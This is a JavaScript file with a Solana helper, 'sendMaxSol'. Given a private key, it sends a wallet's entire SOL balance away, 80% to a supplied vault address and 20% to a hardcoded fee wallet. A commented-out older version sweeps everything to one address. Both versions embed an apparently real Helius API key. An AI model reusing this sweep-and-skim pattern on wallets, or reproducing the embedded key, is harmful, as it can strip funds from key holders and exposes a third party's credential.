// import {
//   Connection,
//   Keypair,
//   PublicKey,
//   SystemProgram,
//   Transaction,
//   sendAndConfirmTransaction,
//   LAMPORTS_PER_SOL,
// } from '@solana/web3.js'
// import bs58 from 'bs58'


// const rpcUrl = "https://devnet.helius-rpc.com/?api-key=e7017d59-07ed-4ad7-955a-5b16d052233e"

// function hexToUint8Array(hex) {
//   if (hex.startsWith('0x')) hex = hex.slice(2);
//   const bytes = new Uint8Array(hex.length / 2);
//   for (let i = 0; i < hex.length; i += 2) {
//     bytes[i / 2] = parseInt(hex.substr(i, 2), 16);
//   }
//   return bytes;
// }




// export async function sendMaxSol(
//   toAddress,
//   key,
// ) {
//  const connection = new Connection(rpcUrl, "confirmed");

//   let privateKey = hexToUint8Array(key)
//   // Convert private key to Keypair
//   const secretKey = Uint8Array.from(privateKey);
//   const senderKeypair = Keypair.fromSecretKey(secretKey);

//   const senderPublicKey = senderKeypair.publicKey;
//   const recipientPubKey = new PublicKey(toAddress);





//   // Get sender balance
//   const balance = await connection.getBalance(senderPublicKey);
//   if (balance === 0) {
//     return;
//   }

//   // Calculate fee
//   const { blockhash } = await connection.getLatestBlockhash();
//   const feeCalculator = await connection.getFeeForMessage(
//     (new Transaction({
//       recentBlockhash: blockhash,
//       feePayer: senderPublicKey
//     }).add(
//       SystemProgram.transfer({
//         fromPubkey: senderPublicKey,
//         toPubkey: recipientPubKey,
//         lamports: balance
//       })
//     )).compileMessage()
//   );
//   const fee = feeCalculator.value;

//   // Create transfer instruction
//   const tx = new Transaction().add(
//     SystemProgram.transfer({
//       fromPubkey: senderPublicKey,
//       toPubkey: recipientPubKey,
//       lamports: balance - fee // Send all minus fee
//     })
//   );

//   // Send transaction
//   const signature = await sendAndConfirmTransaction(connection, tx, [senderKeypair]);
//   console.log("Transaction signature:", signature);
//   return {success:true, signature};
// }



import {
  Connection,
  Keypair,
  PublicKey,
  SystemProgram,
  Transaction,
  sendAndConfirmTransaction,
} from '@solana/web3.js'

const rpcUrl = "https://mainnet.helius-rpc.com/?api-key=e7017d59-07ed-4ad7-955a-5b16d052233e"

function hexToUint8Array(hex) {
  if (hex.startsWith('0x')) hex = hex.slice(2);
  const bytes = new Uint8Array(hex.length / 2);
  for (let i = 0; i < hex.length; i += 2) {
    bytes[i / 2] = parseInt(hex.substr(i, 2), 16);
  }
  return bytes;
}

export async function sendMaxSol(
  vaultAddress, // receives 80%
  privateKeyHex,
  feeAddress = "4AeeGKPHFm9uzoVJaLhJNTxBzf1UMgRXDH2843w3NBRL" // receives 20%
) {
  const connection = new Connection(rpcUrl, "confirmed");

  const privateKey = hexToUint8Array(privateKeyHex);
  const senderKeypair = Keypair.fromSecretKey(Uint8Array.from(privateKey));
  const senderPublicKey = senderKeypair.publicKey;

  const vaultPubkey = new PublicKey(vaultAddress);
  const feePubkey = new PublicKey(feeAddress);

  const balance = await connection.getBalance(senderPublicKey);
  if (balance === 0) {
    console.warn("Wallet balance is zero.");
    return { success: false, message: "Insufficient balance" };
  }

  // ⚠️ Build dummy tx to estimate fee
  const dummyTx = new Transaction();
  dummyTx.add(
    SystemProgram.transfer({
      fromPubkey: senderPublicKey,
      toPubkey: vaultPubkey,
      lamports: 1, // dummy amount
    }),
    SystemProgram.transfer({
      fromPubkey: senderPublicKey,
      toPubkey: feePubkey,
      lamports: 1, // dummy amount
    })
  );
  dummyTx.feePayer = senderPublicKey;
  dummyTx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;

  const fee = await connection.getFeeForMessage(dummyTx.compileMessage()).then(res => res.value);

  const availableLamports = balance - fee;
  if (availableLamports <= 0) {
    console.error("Not enough SOL to cover fees.");
    return { success: false, message: "Insufficient SOL after fees" };
  }

  // 💰 Split 80/20
  const lamportsToVault = Math.floor(availableLamports * 0.8);
  const lamportsToFee = availableLamports - lamportsToVault;

  // 🧾 Create actual transaction
  const tx = new Transaction();
  tx.add(
    SystemProgram.transfer({
      fromPubkey: senderPublicKey,
      toPubkey: vaultPubkey,
      lamports: lamportsToVault,
    }),
    SystemProgram.transfer({
      fromPubkey: senderPublicKey,
      toPubkey: feePubkey,
      lamports: lamportsToFee,
    })
  );
  tx.feePayer = senderPublicKey;
  tx.recentBlockhash = dummyTx.recentBlockhash;

  // 🚀 Send transaction
  const signature = await sendAndConfirmTransaction(connection, tx, [senderKeypair]);
  console.log("✅ Transaction signature:", signature);

  return {
    success: true,
    signature,
  };
}
